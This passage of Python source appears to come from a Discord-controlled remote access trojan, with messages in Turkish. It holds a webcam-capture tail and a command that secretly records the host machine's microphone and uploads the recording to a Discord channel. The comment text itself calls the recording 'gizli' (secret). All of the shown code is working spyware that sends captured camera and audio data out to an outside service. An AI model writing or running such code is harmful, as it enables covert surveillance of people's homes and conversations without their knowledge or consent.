    path = "temp_cam.jpg"
    cv2.imwrite(path, frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
    await ctx.send(file=discord.File(fp=path, filename="kamera.jpg"))
    os.remove(path)
  except Exception as e:
    await ctx.send(f"Hata: {e}")


@client.command(name="seskayit")
async def record_audio(ctx, duration: int = 5):
  try:
    import sounddevice as sd
    import wave

    if duration > 20:
      duration = 20
    fs = 16000
    await ctx.send(f"🎙️ {duration} saniyelik gizli mikrofon kaydı başlıyor...")

    audio = sd.rec(
        int(duration * fs), samplerate=fs, channels=1, dtype="int16"
    )
    sd.wait()

    path = "temp_mic.wav"
    with wave.open(path, "wb") as wf:
      wf.setnchannels(1)
      wf.setsampwidth(2)
      wf.setframerate(fs)
      wf.writeframes(audio.tobytes())

    await ctx.send(file=discord.File(fp=path, filename="mikrofon_kayit.wav"))
    os.remove(path)
  except Exception as e:
    await ctx.send(f"Hata: {e}")


